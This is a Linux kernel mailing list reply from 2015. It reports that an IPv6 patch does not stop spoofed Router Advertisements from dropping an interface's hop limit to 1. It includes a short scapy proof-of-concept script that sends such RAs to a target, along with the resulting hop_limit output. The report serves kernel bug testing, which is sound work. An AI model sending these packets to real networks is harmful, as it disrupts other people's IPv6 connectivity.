From: Denys Vlasenko <vda.linux@googlemail.com>
Subject: Re: [GIT] Networking
Date: Wed, 29 Apr 2015 16:51:52 +0200
Message-ID: <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>
References: <20150401.154847.612566794393812348.davem@davemloft.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: Linus Torvalds <torvalds@linux-foundation.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	netdev@vger.kernel.org,
	Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
	"D.S. Ljungmark" <ljungmark@modio.se>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	Don Howard <dhoward@redhat.com>
To: David Miller <davem@davemloft.net>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <20150401.154847.612566794393812348.davem@davemloft.net>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On Wed, Apr 1, 2015 at 9:48 PM, David Miller <davem@davemloft.net> wrote:
> D.S. Ljungmark (1):
>       ipv6: Don't reduce hop limit for an interface

https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6fd99094de2b83d1d4c8457f2c83483b2828e75a

I was testing this change and apparently it doesn't close the hole.

The python script I use to send RAs:

#!/usr/bin/env python
import sys
import time
import scapy.all
from scapy.layers.inet6 import *
ip = IPv6()
# ip.dst = 'ff02::1'
ip.dst = sys.argv[1]
icmp = ICMPv6ND_RA()
icmp.chlim = 1
for x in range(10):
    send(ip/icmp)
    time.sleep(1)

# ./ipv6-hop-limit.py fe80::21e:37ff:fed0:5006
.
Sent 1 packets.
...<10 times>...
Sent 1 packets.

After I do this, on the targeted machine I check hop_limits:

# for f in /proc/sys/net/ipv6/conf/*/hop_limit; do echo -n $f:; cat $f; done
/proc/sys/net/ipv6/conf/all/hop_limit:64
/proc/sys/net/ipv6/conf/default/hop_limit:64
/proc/sys/net/ipv6/conf/enp0s25/hop_limit:1  <=== THIS
/proc/sys/net/ipv6/conf/lo/hop_limit:64
/proc/sys/net/ipv6/conf/wlp3s0/hop_limit:64

As you see, the interface which received RAs still lowered
its hop_limit to 1. I take it means that the bug is still present
(right? I'm not a network guy...).

I triple-checked that I do run the kernel with the fix.
Further investigation shows that the code touched by the fix
is not even reached, hop_limit is changed elsewhere.

I'm willing to test additional patches.
